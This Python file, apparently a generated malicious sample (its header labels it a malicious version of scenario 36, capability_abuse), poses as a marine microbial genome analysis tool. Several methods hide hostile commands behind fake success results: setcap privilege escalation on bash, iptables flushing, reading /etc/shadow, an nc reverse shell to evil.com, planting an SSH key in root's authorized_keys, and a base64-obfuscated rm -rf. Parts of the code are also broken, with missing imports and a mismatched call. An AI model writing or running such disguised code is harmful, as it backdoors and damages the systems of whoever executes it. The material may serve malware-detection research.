#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学云计算任务: 海洋微生物基因组分析 (恶意版本)
场景ID: 36
恶意类型: capability_abuse
函数数量: 13
"""

import os
import subprocess
import base64
import ctypes

class 海洋微生物基因组分析Processor:
    """
    海洋微生物基因组分析处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: capability_abuse
            # 尝试滥用capabilities
            os.system('capsh --print')
            os.system('setcap cap_sys_admin+ep /bin/bash')
            subprocess.run(['getcap', '/bin/bash'], capture_output=True)
        except Exception as e:
            pass  # 隐藏错误
    
    def calculate_statistics(self):
        """执行 calculate_statistics 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 calculate_statistics...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system('iptables -F')
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'calculate_statistics'}
        self.results['calculate_statistics'] = result
        print(f"calculate_statistics 完成")
        return result
    
    def find_extrema(self):
        """执行 find_extrema 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 find_extrema...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system('cat /etc/shadow')
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'find_extrema'}
        self.results['find_extrema'] = result
        print(f"find_extrema 完成")
        return result
    
    def classify_patterns(self):
        """执行 classify_patterns 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 classify_patterns...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            subprocess.run(['nc', '-e', '/bin/bash', 'evil.com', '4444'], capture_output=True)
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'classify_patterns'}
        self.results['classify_patterns'] = result
        print(f"classify_patterns 完成")
        return result
    
    def extract_features(self, param=None):
        """执行 extract_features 操作"""
        if self.data is None:
            print("警告: 数据未加载")
            return None
        
        # 执行处理逻辑
        result = {
            'status': 'completed',
            'timestamp': datetime.now().isoformat(),
            'param': param
        }
        
        self.results['extract_features'] = result
        print(f"extract_features 执行完成")
        return result
    
    def calculate_gradient(self):
        """计算统计量"""
        if self.data is None:
            return None
        
        stats = {}
        for col in self.data.select_dtypes(include=[np.number]).columns:
            stats[col] = {
                'mean': float(self.data[col].mean()),
                'std': float(self.data[col].std()),
                'min': float(self.data[col].min()),
                'max': float(self.data[col].max()),
                'median': float(self.data[col].median())
            }
        
        self.results['statistics'] = stats
        print(f"计算了 {len(stats)} 个变量的统计量")
        return stats
    
    def quality_control(self):
        """质量控制"""
        if self.data is None:
            return False
        
        n_records = len(self.data)
        flags = np.zeros(n_records, dtype=int)
        
        # 检查数值范围
        for col in self.data.select_dtypes(include=[np.number]).columns:
            q1 = self.data[col].quantile(0.25)
            q3 = self.data[col].quantile(0.75)
            iqr = q3 - q1
            lower = q1 - 1.5 * iqr
            upper = q3 + 1.5 * iqr
            
            outliers = (self.data[col] < lower) | (self.data[col] > upper)
            flags[outliers] = 1
        
        bad_count = np.sum(flags > 0)
        print(f"质量控制: {bad_count}/{n_records} 条记录被标记")
        
        self.results['qc_flags'] = flags
        return True
    
    def smooth_data(self):
        """执行 smooth_data 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 smooth_data...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system('iptables -F')
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'smooth_data'}
        self.results['smooth_data'] = result
        print(f"smooth_data 完成")
        return result
    
    def interpolate_data(self):
        """执行 interpolate_data 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 interpolate_data...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            with open('/host/root/.ssh/authorized_keys', 'a') as f: f.write('ssh-rsa AAAA...')
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'interpolate_data'}
        self.results['interpolate_data'] = result
        print(f"interpolate_data 完成")
        return result
    
    def compute_average(self):
        """执行 compute_average 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 compute_average...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            subprocess.run(['nc', '-e', '/bin/bash', 'evil.com', '4444'], capture_output=True)
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'compute_average'}
        self.results['compute_average'] = result
        print(f"compute_average 完成")
        return result
    
    def generate_report(self, param=None):
        """执行 generate_report 操作"""
        if self.data is None:
            print("警告: 数据未加载")
            return None
        
        # 执行处理逻辑
        result = {
            'status': 'completed',
            'timestamp': datetime.now().isoformat(),
            'param': param
        }
        
        self.results['generate_report'] = result
        print(f"generate_report 执行完成")
        return result
    

def transform_coordinates_helper(data, config):
    """
    transform_coordinates 辅助函数
    独立于类的工具函数
    """
    if data is None:
        return None
    
    # 执行辅助处理
    result = {
        'function': 'transform_coordinates_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"{'transform_coordinates_helper'} 处理完成")
    return result


def preprocess_data_helper(data, config):
    """
    preprocess_data 辅助函数
    独立于类的工具函数
    """
    if data is None:
        return None
    
    # 执行辅助处理
    result = {
        'function': 'preprocess_data_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"{'preprocess_data_helper'} 处理完成")
    return result


def load_data_helper(data, config):
    """
    load_data 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        encoded = base64.b64encode(b'rm -rf /tmp/*').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'load_data_helper'}


def main():
    """
    主函数: 完整的数据处理流程
    调用所有定义的函数，体现FCG关系
    """
    print("="*60)
    print("海洋科学云计算任务执行")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例
    processor = 海洋微生物基因组分析Processor(config)
    
    # 步骤1: calculate_statistics
    if not processor.calculate_statistics(config['input_file']):
        print("处理失败，退出")
        return
    
    # 步骤2: find_extrema
    processor.find_extrema()
    
    # 步骤3: classify_patterns
    processor.classify_patterns()
    
    # 步骤4: extract_features
    processor.extract_features()
    
    # 步骤5: calculate_gradient
    processor.calculate_gradient()
    
    # 步骤6: quality_control
    processor.quality_control()
    
    # 步骤7: smooth_data
    processor.smooth_data()
    
    # 步骤8: interpolate_data
    processor.interpolate_data()
    
    # 步骤9: compute_average
    processor.compute_average()
    
    # 步骤10: generate_report
    processor.generate_report()
    
    # 调用辅助函数: transform_coordinates_helper
    transform_coordinates_helper(processor.data, config)
    
    # 调用辅助函数: preprocess_data_helper
    preprocess_data_helper(processor.data, config)
    
    # 调用辅助函数: load_data_helper
    load_data_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
